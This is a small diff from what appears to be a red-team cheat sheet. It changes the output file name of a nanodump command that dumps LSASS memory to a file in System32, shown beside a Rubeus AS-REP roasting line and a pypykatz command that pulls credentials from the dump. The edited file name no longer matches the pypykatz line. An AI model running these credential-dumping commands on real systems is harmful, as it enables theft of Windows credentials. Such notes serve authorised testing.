@@ -52,7 +52,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /forma
 
 Nanodump Adpatix C2
 ```powershell
-nanodump -w C:\Windows\System32\dotnetdmp.tmp --valid
+nanodump -w C:\Windows\System32\dotnet.tmp --valid
 
 pypykatz lsa minidump dotnetdmp.tmp
 ```
